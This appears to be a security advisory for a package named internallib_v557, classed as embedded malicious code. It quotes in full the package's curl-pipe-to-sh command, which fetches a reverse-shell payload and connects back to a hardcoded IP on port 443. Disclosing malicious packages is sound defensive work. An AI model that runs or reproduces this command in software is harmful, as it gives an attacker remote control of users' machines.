summary: Reverse shell to hardcoded attacker IP via exported command()
details: The package exposes a single function `command()` whose body unconditionally executes `/bin/bash -c "curl https://reverse-shell.sh/10.10.14.5:443|sh"` (index.js line 4). The call fetches a shell payload from reverse-shell.sh parameterized for the hardcoded private IP 10.10.14.5 on port 443 and pipes it to sh, yielding a reverse shell to that endpoint. 10.10.14.5 is an RFC1918 address typical of HTB/CTF attacker tun0 ranges, and the package name `internallib_v557` is a generic placeholder with no documented purpose — the only effect of the library's sole export is to hand the operator a remote shell on the consumer's machine. Any consumer that imports the package and invokes the exported function is fully compromised.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
